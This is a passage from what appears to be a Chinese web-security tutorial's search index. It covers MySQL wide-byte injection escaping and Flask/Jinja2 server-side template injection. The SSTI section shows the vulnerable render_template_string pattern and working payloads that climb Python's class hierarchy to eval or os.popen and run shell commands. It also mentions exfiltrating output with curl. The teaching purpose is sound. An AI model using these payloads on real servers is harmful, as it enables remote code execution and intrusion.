character_set_results=gbk,character_set_client=binary\n\n\u4f7f\u7528mysql_real_escape_string\u8fdb\u884c\u8f6c\u4e49\n\nmysql_real_escape_string\u4e0eaddslashes\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5176\u4f1a\u8003\u8651\u5f53\u524d\u8bbe\u7f6e\u7684\u5b57\u7b26\u96c6\uff08\u4f7f\u7528mysql_set_charset\u6307\u5b9a\u5b57\u7b26\u96c6\uff09\uff0c\u4e0d\u4f1a\u51fa\u73b0\u524d\u9762\u7684df\u548c5c\u62fc\u63a5\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u8282\u7684\u95ee\u9898\n\u4ee5\u4e0a\u4e24\u4e2a\u6761\u4ef6\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u624d\u884c\uff0c\u7f3a\u4e00\u4e0d\u53ef\u3002\n</code></pre> <p>\u53c2\u8003</p> <p>\u53c2\u8003</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sqlsever","title":"SqlSever","text":"<p>\u6316\u5751</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sqllite","title":"SqlLite","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#postsql","title":"PostSql","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#oracle","title":"Oracle","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/","title":"SSTI","text":"<p> \u7ea6 2758 \u4e2a\u5b57  432 \u884c\u4ee3\u7801  4 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>SSTI\u5c31\u662f\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165(Server-Side Template Injection)</p> <p>\u672c\u8d28\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</p> <p>SSTI\u4e5f\u662f\u83b7\u53d6\u4e86\u4e00\u4e2a\u8f93\u5165\uff0c\u7136\u540e\u5728\u540e\u7aef\u7684\u6e32\u67d3\u5904\u7406\u4e0a\u8fdb\u884c\u4e86\u8bed\u53e5\u7684\u62fc\u63a5\uff0c\u7136\u540e\u6267\u884c\uff0cSSTI\u5229\u7528\u7684\u662f\u73b0\u5728\u7684\u7f51\u7ad9\u6a21\u677f\u5f15\u64ce\uff0c\u6a21\u677f\u5f15\u64ce\uff08\u8fd9\u91cc\u7279\u6307\u7528\u4e8eWeb\u5f00\u53d1\u7684\u6a21\u677f\u5f15\u64ce\uff09\u662f\u4e3a\u4e86\u4f7f\u7528\u6237\u754c\u9762\u4e0e\u4e1a\u52a1\u6570\u636e\uff08\u5185\u5bb9\uff09\u5206\u79bb\u800c\u4ea7\u751f\u7684\uff0c\u5b83\u53ef\u4ee5\u751f\u6210\u7279\u5b9a\u683c\u5f0f\u7684\u6587\u6863\uff0c\u7528\u4e8e\u7f51\u7ad9\u7684\u6a21\u677f\u5f15\u64ce\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u6807\u51c6\u7684HTML\u6587\u6863\uff0c\u4e3b\u8981\u9488\u5bf9python\u3001php\u3001java\u7684\u4e00\u4e9b\u7f51\u7ad9\u5904\u7406\u6846\u67b6\uff0c\u6bd4\u5982Python\u7684jinja2\u3001mako\u3001tornado\u3001django\uff0cphp\u7684smarty\u3001twig\uff0cjava\u7684jade\u3001velocity\uff0cThymeleaf\u3002\u5f53\u8fd9\u4e9b\u6846\u67b6\u5bf9\u8fd0\u7528\u6e32\u67d3\u51fd\u6570\u751f\u6210html\u7684\u65f6\u5019\uff0c\u6709\u65f6\u5c31\u4f1a\u51fa\u73b0SSTI\u7684\u95ee\u9898\u3002</p> <p>\u7c7b\u4f3cSQL\u6ce8\u5165\u5c06\u8bed\u53e5\u95ed\u5408\uff0c\u4ea7\u751f\u6ce8\u5165\u7684\u6548\u679c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#python","title":"Python","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#flask","title":"FLASK","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_1","title":"\u6f0f\u6d1e\u6210\u56e0","text":"<p>flask\u662f\u4f7f\u7528<code>Jinja2</code>\u6765\u4f5c\u4e3a\u6e32\u67d3\u5f15\u64ce\u7684</p> <p>flask\u7684\u6e32\u67d3\u65b9\u6cd5\u6709<code>render_template</code>\u3002</p> <ul> <li>Flask\u63d0\u4f9b\u7684<code>render_template</code>\u51fd\u6570\u5c01\u88c5\u4e86\u8be5\u6a21\u677f\u5f15\u64ce</li> <li><code>render_template</code>\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6a21\u677f\u7684\u6587\u4ef6\u540d,\u540e\u9762\u7684\u53c2\u6570\u90fd\u662f\u952e\u503c\u5bf9,\u8868\u793a\u6a21\u677f\u4e2d\u53d8\u91cf\u5bf9\u5e94\u7684\u771f\u5b9e\u503c</li> </ul> <p>\u4f7f\u7528\u5982\u4e0b</p> <ol> <li><code>{{}}</code>\u6765\u8868\u793a\u53d8\u91cf\u540d,\u8fd9\u79cd<code>{{}}</code>\u8bed\u6cd5\u53eb\u505a\u53d8\u91cf\u4ee3\u7801\u5757</li> </ol> <pre><code>{{post.title}}\n</code></pre> <p>Jinja2\u6a21\u677f\u4e2d\u7684\u53d8\u91cf\u4ee3\u7801\u5757\u53ef\u4ee5\u662f\u4efb\u610fPython\u7c7b\u578b\u6216\u8005\u5bf9\u8c61\uff0c\u53ea\u8981\u5b83\u80fd\u591f\u88abPython\u7684<code>str()</code>\u65b9\u6cd5\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5c31\u53ef\u4ee5\uff0c\u6bd4\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\u663e\u793a\u4e00\u4e2a\u5b57\u5178\u6216\u8005\u5217\u8868\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20</p> <pre><code>{{testdict['key']}}\n{{testlist[0]}}\n</code></pre> <ol> <li>\u7528<code>{%%}</code>\u5b9a\u4e49\u7684\u63a7\u5236\u4ee3\u7801\u5757\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u8bed\u8a00\u5c42\u6b21\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u5faa\u73af\u8bed\u53e5</li> </ol> <pre><code>{% if user %}\n    {{ user }}\n{% else %}\n    hello!\n&lt;ul&gt;\n    {% for index in indexs %}\n    &lt;li&gt; {{ index }} &lt;/li&gt;\n    {% endfor %}\n&lt;/ul&gt;\n</code></pre> <ol> <li>\u4f7f\u7528<code>{##}</code>\u8fdb\u884c\u6ce8\u91ca,\u6ce8\u91ca\u7684\u5185\u5bb9\u4e0d\u4f1a\u5728html\u4e2d\u88ab\u6e32\u67d3\u51fa\u6765</li> </ol> <pre><code>{#{{ name }}#}\n</code></pre> <p>\u8fd8\u6709\u4e00\u4e2a<code>render_template_string</code>\u5219\u662f\u7528\u6765\u6e32\u67d3\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u3002SSTI\u4e0e\u8fd9\u4e2a\u65b9\u6cd5\u5bc6\u4e0d\u53ef\u5206\u3002</p> <pre><code>html = '&lt;h1&gt;This is index page&lt;/h1&gt;'\nreturn render_template_string(html)\n</code></pre> <p>\u4e0d\u6b63\u786e\u7684\u4f7f\u7528\u6e32\u67d3\u6a21\u677f\u51fd\u6570\u5c31\u4f1a\u5f15\u53d1SSTI</p> <p>\u5982\uff1a</p> <pre><code>code = \u8f93\u5165\n\ntemplate = \"\"\"\n    &lt;h1&gt;%s&lt;/h1&gt;\n\"\"\"%(code)\n\nrender_template_string(template)\n</code></pre> <p><code>render_template_string</code>\u51fd\u6570\u5728\u6e32\u67d3\u6a21\u677f\u7684\u65f6\u5019\u4f7f\u7528\u4e86<code>%s</code>\u6765\u52a8\u6001\u7684\u66ff\u6362\u5b57\u7b26\u4e32\uff0c\u4e14<code>code</code>\u662f\u53ef\u63a7\u7684\uff0c\u56e0\u4e3aflask\u662f\u57fa\u4e8ejinja2\u7684\uff0cJinja2\u5728\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u628a<code>{{}}</code>\u5305\u88f9\u7684\u5185\u5bb9\u5f53\u505a\u53d8\u91cf\u89e3\u6790\u66ff\u6362</p> <p>\u5373Jinja2\u4f1a\u5c06<code>{{}}</code>\u5185\u7684\u5185\u5bb9\u89e3\u6790\u4e3aPython\u8868\u8fbe\u5f0f\u5e76\u6267\u884c\uff0c\u6700\u7ec8\u5c06\u7ed3\u679c\u63d2\u5165\u5230\u6a21\u677f\u4e2d\u3002</p> <p>\u8fd9\u65f6\u8f93\u5165{{7*7}}\u4f1a\u8fd4\u56de49</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>python\u662foop\u8bed\u8a00</p> <p>\u53ef\u4ee5\u5229\u7528\u5185\u7f6e\u5bf9\u8c61\u6216\u8005\u9b54\u672f\u65b9\u6cd5\uff08<code>__class__</code>,<code>__base__</code>\u7b49\uff09\u6765\u5b9e\u73b0\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u5373\u5229\u7528python\u7684\u5185\u7f6e\u7c7b</p> <p>\u4e00\u4e9b\u7528\u5230\u7684\u9b54\u672f\u65b9\u6cd5</p> <p><code>__class__</code>\uff1a\u7528\u6765\u67e5\u770b\u53d8\u91cf\u6240\u5c5e\u7684\u7c7b\uff0c\u6839\u636e\u524d\u9762\u7684\u53d8\u91cf\u5f62\u5f0f\u53ef\u4ee5\u5f97\u5230\u5176\u6240\u5c5e\u7684\u7c7b\u3002 </p> <p><code>__class__</code> \u662f\u7c7b\u7684\u4e00\u4e2a\u5185\u7f6e\u5c5e\u6027\uff0c\u8868\u793a\u7c7b\u7684\u7c7b\u578b\uff0c\u8fd4\u56de <code>&lt;type 'type'&gt;</code> \uff1b \u4e5f\u662f\u7c7b\u7684\u5b9e\u4f8b\u7684\u5c5e\u6027\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u7c7b\u3002</p> <p>\u5982\u4e0b\uff0c\u4f1a\u8fd4\u56de<code>\"\"</code>\uff08\u5b57\u7b26\u7684\u7c7b\u7684\u7c7b\u578b\uff0c\u540c\u6837\u5176\u4ed6<code>dict</code> <code>tuple</code>\u90fd\u53ef\u4ee5\uff09</p> <pre><code>Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\".__class__\n&lt;class 'str'&gt;\n</code></pre> <p><code>__bases__</code>\uff1a\u7528\u6765\u67e5\u770b\u7c7b\u7684\u57fa\u7c7b\uff0c\u901a\u8fc7\u8be5\u5c5e\u6027\u53ef\u4ee5\u67e5\u770b\u8be5\u7c7b\u7684\u6240\u6709\u76f4\u63a5\u7236\u7c7b\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u6240\u6709\u76f4\u63a5\u7236\u7c7b\uff08objece\uff09\u7ec4\u6210\u7684 \u5143\u7ec4 \uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7d22\u5f15\u6765\u67e5\u770b\u7279\u5b9a\u4f4d\u7f6e\u7684\u503c\u3002 </p> <pre><code>Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\".__class__\n&lt;class 'str'&gt;\n&gt;&gt;&gt; \"\".__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; \"\".__class__.__bases__[0]\n&lt;class 'object'&gt;\n</code></pre> <p>\u9664\u4e86<code>__bases__</code>\u83b7\u53d6\u57fa\u7c7b\u8fd8\u80fd\u7528 <code>__mro__</code> \u65b9\u6cd5\uff0c<code>__mro__</code> \u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u7c7b\u7684\u8c03\u7528\u987a\u5e8f\uff0c\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\u540c\u6837\u662f\u5143\u7ec4</p> <pre><code>Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\".__class__\n&lt;class 'str'&gt;\n&gt;&gt;&gt; \"\".__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; \"\".__class__.__bases__[0]\n&lt;class 'object'&gt;\n&gt;&gt;&gt; \"\".__class__.__mro__\n(&lt;class 'str'&gt;, &lt;class 'object'&gt;)\n&gt;&gt;&gt; \"\".__class__.__mro__[0]\n&lt;class 'str'&gt;\n&gt;&gt;&gt; \"\".__class__.__mro__[1]\n&lt;class 'object'&gt;\n</code></pre> <p>\u8fd8\u6709\u4e00\u4e2a\u66f4\u7b80\u5355\u7684<code>__base__</code></p> <pre><code>Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\".__class__\n&lt;class 'str'&gt;\n&gt;&gt;&gt; \"\".__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; \"\".__class__.__bases__[0]\n&lt;class 'object'&gt;\n&gt;&gt;&gt; \"\".__class__.__mro__\n(&lt;class 'str'&gt;, &lt;class 'object'&gt;)\n&gt;&gt;&gt; \"\".__class__.__mro__[0]\n&lt;class 'str'&gt;\n&gt;&gt;&gt; \"\".__class__.__mro__[1]\n&lt;class 'object'&gt;\n&gt;&gt;&gt; \"\".__class__.__base__\n&lt;class 'object'&gt;\n</code></pre> <p>\u6709\u8fd9\u4e9b\u7c7b\u7ee7\u627f\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u4efb\u4f55\u4e00\u4e2a\u53d8\u91cf\uff0c\u56de\u6eaf\u5230\u6700\u9876\u5c42\u57fa\u7c7b<code>&lt;class'object'&gt;</code>\uff0c\u518d\u83b7\u5f97\u5230\u6b64\u57fa\u7c7b\u6240\u6709\u5b9e\u73b0\u7684\u7c7b\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230python\u7684\u6240\u6709\u5185\u7f6e\u7c7b\u548c\u65b9\u6cd5</p> <p><code>__subclasses__()</code>\uff1a\u67e5\u770b\u5f53\u524d\u7c7b\u7684\u5b50\u7c7b\u7ec4\u6210\u7684\u5217\u8868\uff0c\u5373\u6211\u4eec\u8981\u8fd4\u56de\u57fa\u7c7b<code>object</code>\u7684\u5b50\u7c7b,\u6570\u7ec4\u7c7b\u578b\uff0c\u53d7python\u7248\u672c\u9650\u5236</p> \u5c55\u5f00 <pre><code>```shell\nPython 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\".__class__.__base__.__subclasses__()\n[&lt;class 'type'&gt;\n&lt;class 'async_generator'&gt;\n&lt;class 'int'&gt;\n&lt;class 'bytearray_iterator'&gt;\n&lt;class 'bytearray'&gt;\n&lt;class 'bytes_iterator'&gt;\n&lt;class 'bytes'&gt;\n&lt;class 'builtin_function_or_method'&gt;\n&lt;class 'callable_iterator'&gt;\n&lt;class 'PyCapsule'&gt;\n&lt;class 'cell'&gt;\n&lt;class 'classmethod_descriptor'&gt;\n&lt;class 'classmethod'&gt;\n&lt;class 'code'&gt;\n&lt;class 'complex'&gt;\n&lt;class 'coroutine'&gt;\n&lt;class 'dict_items'&gt;\n&lt;class 'dict_itemiterator'&gt;\n&lt;class 'dict_keyiterator'&gt;\n&lt;class 'dict_valueiterator'&gt;\n&lt;class 'dict_keys'&gt;\n&lt;class 'mappingproxy'&gt;\n&lt;class 'dict_reverseitemiterator'&gt;\n&lt;class 'dict_reversekeyiterator'&gt;\n&lt;class 'dict_reversevalueiterator'&gt;\n&lt;class 'dict_values'&gt;\n&lt;class 'dict'&gt;\n&lt;class 'ellipsis'&gt;\n&lt;class 'enumerate'&gt;\n&lt;class 'float'&gt;\n&lt;class 'frame'&gt;\n&lt;class 'frozenset'&gt;\n&lt;class 'function'&gt;\n&lt;class 'generator'&gt;\n&lt;class 'getset_descriptor'&gt;\n&lt;class 'instancemethod'&gt;\n&lt;class 'list_iterator'&gt;\n&lt;class 'list_reverseiterator'&gt;\n&lt;class 'list'&gt;\n&lt;class 'longrange_iterator'&gt;\n&lt;class 'member_descriptor'&gt;\n&lt;class 'memoryview'&gt;\n&lt;class 'method_descriptor'&gt;\n&lt;class 'method'&gt;\n&lt;class 'moduledef'&gt;\n&lt;class 'module'&gt;\n&lt;class 'odict_iterator'&gt;\n&lt;class 'pickle.PickleBuffer'&gt;\n&lt;class 'property'&gt;\n&lt;class 'range_iterator'&gt;\n&lt;class 'range'&gt;\n&lt;class 'reversed'&gt;\n&lt;class 'symtable entry'&gt;\n&lt;class 'iterator'&gt;\n&lt;class 'set_iterator'&gt;\n&lt;class 'set'&gt;\n&lt;class 'slice'&gt;\n&lt;class 'staticmethod'&gt;\n&lt;class 'stderrprinter'&gt;\n&lt;class 'super'&gt;\n&lt;class 'traceback'&gt;\n&lt;class 'tuple_iterator'&gt;\n&lt;class 'tuple'&gt;\n&lt;class 'str_iterator'&gt;\n&lt;class 'str'&gt;\n&lt;class 'wrapper_descriptor'&gt;\n&lt;class 'types.GenericAlias'&gt;\n&lt;class 'anext_awaitable'&gt;\n&lt;class 'async_generator_asend'&gt;\n&lt;class 'async_generator_athrow'&gt;\n&lt;class 'async_generator_wrapped_value'&gt;\n&lt;class 'coroutine_wrapper'&gt;\n&lt;class 'InterpreterID'&gt;\n&lt;class 'managedbuffer'&gt;\n&lt;class 'method-wrapper'&gt;\n&lt;class 'types.SimpleNamespace'&gt;\n&lt;class 'NoneType'&gt;\n&lt;class 'NotImplementedType'&gt;\n&lt;class 'weakref.CallableProxyType'&gt;\n&lt;class 'weakref.ProxyType'&gt;\n&lt;class 'weakref.ReferenceType'&gt;\n&lt;class 'types.UnionType'&gt;\n&lt;class 'EncodingMap'&gt;\n&lt;class 'fieldnameiterator'&gt;\n&lt;class 'formatteriterator'&gt;\n&lt;class 'BaseException'&gt;\n&lt;class 'hamt'&gt;\n&lt;class 'hamt_array_node'&gt;\n&lt;class 'hamt_bitmap_node'&gt;\n&lt;class 'hamt_collision_node'&gt;\n&lt;class 'keys'&gt;\n&lt;class 'values'&gt;\n&lt;class 'items'&gt;\n&lt;class '_contextvars.Context'&gt;\n&lt;class '_contextvars.ContextVar'&gt;\n&lt;class '_contextvars.Token'&gt;\n&lt;class 'Token.MISSING'&gt;\n&lt;class 'filter'&gt;\n&lt;class 'map'&gt;\n&lt;class 'zip'&gt;\n&lt;class '_frozen_importlib._ModuleLock'&gt;\n&lt;class '_frozen_importlib._DummyModuleLock'&gt;\n&lt;class '_frozen_importlib._ModuleLockManager'&gt;\n&lt;class '_frozen_importlib.ModuleSpec'&gt;\n&lt;class '_frozen_importlib.BuiltinImporter'&gt;\n&lt;class '_frozen_importlib.FrozenImporter'&gt;\n&lt;class '_frozen_importlib._ImportLockContext'&gt;\n&lt;class '_thread.lock'&gt;\n&lt;class '_thread.RLock'&gt;\n&lt;class '_thread._localdummy'&gt;\n&lt;class '_thread._local'&gt;\n&lt;class '_io._IOBase'&gt;\n&lt;class '_io._BytesIOBuffer'&gt;\n&lt;class '_io.IncrementalNewlineDecoder'&gt;\n&lt;class 'posix.ScandirIterator'&gt;\n&lt;class 'posix.DirEntry'&gt;\n&lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;\n&lt;class '_frozen_importlib_external._LoaderBasics'&gt;\n&lt;class '_frozen_importlib_external.FileLoader'&gt;\n&lt;class '_frozen_importlib_external._NamespacePath'&gt;\n&lt;class '_frozen_importlib_external._NamespaceLoader'&gt;\n&lt;class '_frozen_importlib_external.PathFinder'&gt;\n&lt;class '_frozen_importlib_external.FileFinder'&gt;\n&lt;class 'codecs.Codec'&gt;\n&lt;class 'codecs.IncrementalEncoder'&gt;\n&lt;class 'codecs.IncrementalDecoder'&gt;\n&lt;class 'codecs.StreamReaderWriter'&gt;\n&lt;class 'codecs.StreamRecoder'&gt;\n&lt;class '_abc._abc_data'&gt;\n&lt;class 'abc.ABC'&gt;\n&lt;class 'collections.abc.Hashable'&gt;\n&lt;class 'collections.abc.Awaitable'&gt;\n&lt;class 'collections.abc.AsyncIterable'&gt;\n&lt;class 'collections.abc.Iterable'&gt;\n&lt;class 'collections.abc.Sized'&gt;\n&lt;class 'collections.abc.Container'&gt;\n&lt;class 'collections.abc.Callable'&gt;\n&lt;class 'os._wrap_close'&gt;\n&lt;class '_sitebuiltins.Quitter'&gt;\n&lt;class '_sitebuiltins._Printer'&gt;\n&lt;class '_sitebuiltins._Helper'&gt;\n&lt;class '_distutils_hack._TrivialRe'&gt;\n&lt;class '_distutils_hack.DistutilsMetaFinder'&gt;\n&lt;class '_distutils_hack.shim'&gt;\n&lt;class 'types.DynamicClassAttribute'&gt;\n&lt;class 'types._GeneratorWrapper'&gt;\n&lt;class 'warnings.WarningMessage'&gt;\n&lt;class 'warnings.catch_warnings'&gt;\n&lt;class 'importlib._abc.Loader'&gt;\n&lt;class 'itertools.accumulate'&gt;\n&lt;class 'itertools.combinations'&gt;\n&lt;class 'itertools.combinations_with_replacement'&gt;\n&lt;class 'itertools.cycle'&gt;\n&lt;class 'itertools.dropwhile'&gt;\n&lt;class 'itertools.takewhile'&gt;\n&lt;class 'itertools.islice'&gt;\n&lt;class 'itertools.starmap'&gt;\n&lt;class 'itertools.chain'&gt;\n&lt;class 'itertools.compress'&gt;\n&lt;class 'itertools.filterfalse'&gt;\n&lt;class 'itertools.count'&gt;\n&lt;class 'itertools.zip_longest'&gt;\n&lt;class 'itertools.pairwise'&gt;\n&lt;class 'itertools.permutations'&gt;\n&lt;class 'itertools.product'&gt;\n&lt;class 'itertools.repeat'&gt;\n&lt;class 'itertools.groupby'&gt;\n&lt;class 'itertools._grouper'&gt;\n&lt;class 'itertools._tee'&gt;\n&lt;class 'itertools._tee_dataobject'&gt;\n&lt;class 'operator.attrgetter'&gt;\n&lt;class 'operator.itemgetter'&gt;\n&lt;class 'operator.methodcaller'&gt;\n&lt;class 'operator.attrgetter'&gt;\n&lt;class 'operator.itemgetter'&gt;\n&lt;class 'operator.methodcaller'&gt;\n&lt;class 'reprlib.Repr'&gt;\n&lt;class 'collections.deque'&gt;\n&lt;class '_collections._deque_iterator'&gt;\n&lt;class '_collections._deque_reverse_iterator'&gt;\n&lt;class '_collections._tuplegetter'&gt;\n&lt;class 'collections._Link'&gt;\n&lt;class 'functools.partial'&gt;\n&lt;class 'functools._lru_cache_wrapper'&gt;\n&lt;class 'functools.KeyWrapper'&gt;\n&lt;class 'functools._lru_list_elem'&gt;\n&lt;class 'functools.partialmethod'&gt;\n&lt;class 'functools.singledispatchmethod'&gt;\n&lt;class 'functools.cached_property'&gt;\n&lt;class 'contextlib.ContextDecorator'&gt;\n&lt;class 'contextlib.AsyncContextDecorator'&gt;\n&lt;class 'contextlib._GeneratorContextManagerBase'&gt;\n&lt;class 'contextlib._BaseExitStack'&gt;\n&lt;class 'enum.auto'&gt;\n&lt;enum 'Enum'&gt;\n&lt;class 're.Pattern'&gt;\n&lt;class 're.Match'&gt;\n&lt;class '_sre.SRE_Scanner'&gt;\n&lt;class 'sre_parse.State'&gt;\n&lt;class 'sre_parse.SubPattern'&gt;\n&lt;class 'sre_parse.Tokenizer'&gt;\n&lt;class 're.Scanner'&gt;\n&lt;class 'ast.AST'&gt;\n&lt;class 'ast.NodeVisitor'&gt;\n&lt;class 'dis.Bytecode'&gt;\n&lt;class 'tokenize.Untokenizer'&gt;\n&lt;class 'inspect.BlockFinder'&gt;\n&lt;class 'inspect._void'&gt;\n&lt;class 'inspect._empty'&gt;\n&lt;class 'inspect.Parameter'&gt;\n&lt;class 'inspect.BoundArguments'&gt;\n&lt;class 'inspect.Signature'&gt;\n&lt;class 'rlcompleter.Completer'&gt;]\n```\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_3","title":"\u5e38\u7528\u7684\u5b50\u7c7b","text":"<p>\u6267\u884c\u547d\u4ee4\u7684\u5b50\u7c7b</p> <ul> <li>\u53ef\u4ee5\u7528\u6765\u6267\u884c\u547d\u4ee4\u7684\u7c7b\u6709\u5f88\u591a\uff0c\u5176\u57fa\u672c\u539f\u7406\u5c31\u662f\u904d\u5386\u542b\u6709eval\u51fd\u6570\u5373os\u6a21\u5757\u7684\u5b50\u7c7b\uff0c\u5229\u7528\u8fd9\u4e9b\u5b50\u7c7b\u4e2d\u7684eval\u51fd\u6570\u5373os\u6a21\u5757\u6267\u884c\u547d\u4ee4\u3002</li> </ul> <p>\u51e0\u4e2a\u542b\u6709eval\u51fd\u6570\u7684\u7c7b</p> <pre><code>warnings.catch_warnings\nWarningMessage\ncodecs.IncrementalEncoder\ncodecs.IncrementalDecoder\ncodecs.StreamReaderWriter\nos._wrap_close\nreprlib.Repr\nweakref.finalize\netc.\n</code></pre> <pre><code>{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}}+\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_4","title":"\u5176\u4ed6\u6267\u884c\u547d\u4ee4\u7684\u51fd\u6570","text":"<p>os \u6a21\u5757\u6267\u884c\u547d\u4ee4</p> <p>Python\u7684 os \u6a21\u5757\u4e2d\u6709system\u548cpopen\u8fd9\u4e24\u4e2a\u51fd\u6570\u53ef\u7528\u6765\u6267\u884c\u547d\u4ee4\u3002</p> <p><code>system()</code>\u51fd\u6570\u6267\u884c\u547d\u4ee4\u662f\u6ca1\u6709\u56de\u663e\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528system()\u51fd\u6570\u914d\u5408curl\u5916\u5e26\u6570\u636e\uff1b</p> <p><code>popen()</code>\u51fd\u6570\u6267\u884c\u547d\u4ee4\u6709\u56de\u663e\u3002</p> <p>\u9996\u5148\u7f16\u5199\u811a\u672c\u904d\u5386\u76ee\u6807Python\u73af\u5883\u4e2d\u542b\u6709os\u6a21\u5757\u7684\u7c7b\u7684\u7d22\u5f15\u53f7\uff0c\u6bd4\u5982<code>&lt;class 'os._wrap_close'&gt;</code></p> <p>\u968f\u4fbf\u6311\u4e00\u4e2a\u7c7b\u6784\u9020payload\u6267\u884c\u547d\u4ee4\u5373\u53ef\uff1a</p> <pre><code>{{''.__class__.__base__.__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}} \n</code></pre> <p>\u4f46\u662f\u8be5\u65b9\u6cd5\u904d\u5386\u5f97\u5230\u7684\u7c7b\u4e0d\u51c6\u786e\uff0c\u56e0\u4e3a\u4e00\u4e9b\u4e0d\u76f8\u5173\u7684\u7c7b\u540d\u4e2d\u4e5f\u5b58\u5728\u5b57\u7b26\u4e32 \u201cos\u201d\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u8981\u63a2\u7d22\u66f4\u6709\u6548\u7684\u65b9\u6cd5\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5373\u4f7f\u662f\u4f7f\u7528os\u6a21\u5757\u6267\u884c\u547d\u4ee4\uff0c\u5176\u4e5f\u662f\u8c03\u7528\u7684os\u6a21\u5757\u4e2d\u7684popen\u51fd\u6570\uff0c\u90a3\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528popen\u51fd\u6570\uff0c\u5b58\u5728popen\u51fd\u6570\u7684\u7c7b\u4e00\u822c\u662f <code>os._wrap_close</code></p> <p>popen \u51fd\u6570\u6267\u884c\u547d\u4ee4</p> <p>\u5148\u627e\u7d22\u5f15</p> <pre><code>{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}\n</code></pre> <p>importlib \u7c7b\u6267\u884c\u547d\u4ee4</p> 